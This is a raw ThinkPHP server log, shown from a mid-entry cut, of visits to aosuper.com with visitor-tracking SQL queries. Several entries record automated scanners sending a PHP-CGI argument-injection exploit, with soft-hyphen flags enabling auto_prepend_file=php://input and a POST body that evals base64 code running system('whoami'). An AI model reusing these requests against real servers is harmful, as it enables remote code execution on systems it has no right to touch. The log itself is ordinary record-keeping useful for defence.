  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'accept-encoding' => 'gzip',
  'user-agent' => 'Mozilla/5.0 (compatible; vuhuvRBT/2.0; +https://vuhuv.com/rbt.html)',
  'host' => 'www.aosuper.com',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/tb.youanfutang.cn/application/index/controller/Index.php ]
[ info ] [ VIEW ] /www/wwwroot/tb.youanfutang.cn/public/../application/index/view/index/login1.html [ array (
  0 => 'iflogin',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000688s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `webdata` [ RunTime:0.016136s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '194.9.191.20' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.985260s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-09' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.000524s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '194.9.191.20' [ RunTime:0.033417s ]
[ sql ] [ SQL ] INSERT INTO `webdata` (`viewip` , `webpv` , `viewtime` , `operation` , `opertime` , `ipnum` , `ipvip`) VALUES ('194.9.191.20' , 4 , '2024-09' , 'è®¿å®¢-æµè§ˆç½‘é¡µ' , '2024-09-01 20:04:17' , 2 , 'æ™®é€šç½‘å‹') [ RunTime:0.000645s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `webip` = '194.9.191.20'  AND `ucookie` IS NULL [ RunTime:0.006573s ]
---------------------------------------------------------------
[ 2024-09-01T20:05:33+08:00 ] 178.254.24.91 GET aosuper.com/
[è¿è¡Œæ—¶é—´ï¼š0.049414s] [åžåçŽ‡ï¼š20.24req/s] [å†…å­˜æ¶ˆè€—ï¼š2,944.52kb] [æ–‡ä»¶åŠ è½½ï¼š55]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip, deflate, identity',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36 Edg/91.0.864.54',
  'host' => 'aosuper.com',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/tb.youanfutang.cn/application/index/controller/Index.php ]
[ info ] [ VIEW ] /www/wwwroot/tb.youanfutang.cn/public/../application/index/view/index/login1.html [ array (
  0 => 'iflogin',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000776s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `webdata` [ RunTime:0.002664s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '178.254.24.91' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.002741s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-09' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.000296s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '178.254.24.91' [ RunTime:0.006734s ]
[ sql ] [ SQL ] INSERT INTO `webdata` (`viewip` , `webpv` , `viewtime` , `operation` , `opertime` , `ipnum` , `ipvip`) VALUES ('178.254.24.91' , 5 , '2024-09' , 'è®¿å®¢-æµè§ˆç½‘é¡µ' , '2024-09-01 20:05:33' , 3 , 'æ™®é€šç½‘å‹') [ RunTime:0.000411s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `webip` = '178.254.24.91'  AND `ucookie` IS NULL [ RunTime:0.006234s ]
---------------------------------------------------------------
[ 2024-09-01T20:38:10+08:00 ] 141.98.81.44 POST aosuper.com/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input
[è¿è¡Œæ—¶é—´ï¼š0.015987s] [åžåçŽ‡ï¼š62.55req/s] [å†…å­˜æ¶ˆè€—ï¼š1,338.28kb] [æ–‡ä»¶åŠ è½½ï¼š36]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'php-cgi',
    1 => 'php-cgi.exe',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '110',
  'content-type' => 'application/x-www-form-urlencoded',
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.22.0',
  'host' => 'aosuper.com',
)
[ info ] [ PARAM ] array (
  '­d_cgi_force_redirect=0_­d_disable_functions=""_­d_allow_url_include=1_­d_auto_prepend_file=php://input' => '',
  '<?php_phpinfo();_echo_eval(base64_decode(\'ZWNobyAnW1NdJzsgc3lzdGVtKCd3aG9hbWknKTsgZWNobyAnW0VdJzs' => '\')); die()?>',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2024-09-01T20:38:12+08:00 ] 141.98.81.44 GET aosuper.com/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input
[è¿è¡Œæ—¶é—´ï¼š0.015596s] [åžåçŽ‡ï¼š64.12req/s] [å†…å­˜æ¶ˆè€—ï¼š1,335.35kb] [æ–‡ä»¶åŠ è½½ï¼š36]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'php-cgi',
    1 => 'php-cgi.exe',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.22.0',
  'host' => 'aosuper.com',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
  '­d_cgi_force_redirect=0_­d_disable_functions=""_­d_allow_url_include=1_­d_auto_prepend_file=php://input' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2024-09-01T22:14:00+08:00 ] 141.98.81.44 POST aosuper.com/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input
[è¿è¡Œæ—¶é—´ï¼š0.042343s] [åžåçŽ‡ï¼š23.62req/s] [å†…å­˜æ¶ˆè€—ï¼š1,338.28kb] [æ–‡ä»¶åŠ è½½ï¼š36]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'php-cgi',
    1 => 'php-cgi.exe',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '110',
  'content-type' => 'application/x-www-form-urlencoded',
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.22.0',
  'host' => 'aosuper.com',
)
[ info ] [ PARAM ] array (
  '­d_cgi_force_redirect=0_­d_disable_functions=""_­d_allow_url_include=1_­d_auto_prepend_file=php://input' => '',
  '<?php_phpinfo();_echo_eval(base64_decode(\'ZWNobyAnW1NdJzsgc3lzdGVtKCd3aG9hbWknKTsgZWNobyAnW0VdJzs' => '\')); die()?>',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2024-09-01T22:14:02+08:00 ] 141.98.81.44 GET aosuper.com/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input
[è¿è¡Œæ—¶é—´ï¼š0.017915s] [åžåçŽ‡ï¼š55.82req/s] [å†…å­˜æ¶ˆè€—ï¼š1,335.35kb] [æ–‡ä»¶åŠ è½½ï¼š36]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'php-cgi',
    1 => 'php-cgi.exe',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.22.0',
  'host' => 'aosuper.com',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
  '­d_cgi_force_redirect=0_­d_disable_functions=""_­d_allow_url_include=1_­d_auto_prepend_file=php://input' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2024-09-01T23:46:46+08:00 ] 193.29.13.79 POST aosuper.com/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input
[è¿è¡Œæ—¶é—´ï¼š0.023276s] [åžåçŽ‡ï¼š42.96req/s] [å†…å­˜æ¶ˆè€—ï¼š1,338.28kb] [æ–‡ä»¶åŠ è½½ï¼š36]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'php-cgi',
    1 => 'php-cgi.exe',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '110',
  'content-type' => 'application/x-www-form-urlencoded',
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.22.0',
  'host' => 'aosuper.com',
)
[ info ] [ PARAM ] array (
  '­d_cgi_force_redirect=0_­d_disable_functions=""_­d_allow_url_include=1_­d_auto_prepend_file=php://input' => '',
  '<?php_phpinfo();_echo_eval(base64_decode(\'ZWNobyAnW1NdJzsgc3lzdGVtKCd3aG9hbWknKTsgZWNobyAnW0VdJzs' => '\')); die()?>',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2024-09-01T23:46:48+08:00 ] 193.29.13.79 GET aosuper.com/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input
[è¿è¡Œæ—¶é—´ï¼š0.015598s] [åžåçŽ‡ï¼š64.11req/s] [å†…å­˜æ¶ˆè€—ï¼š1,335.35kb] [æ–‡ä»¶åŠ è½½ï¼š36]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'php-cgi',
    1 => 'php-cgi.exe',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.22.0',
  'host' => 'aosuper.com',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
  '­d_cgi_force_redirect=0_­d_disable_functions=""_­d_allow_url_include=1_­d_auto_prepend_file=php://input' => '',
)
[ info ] [ LOG ] INIT File
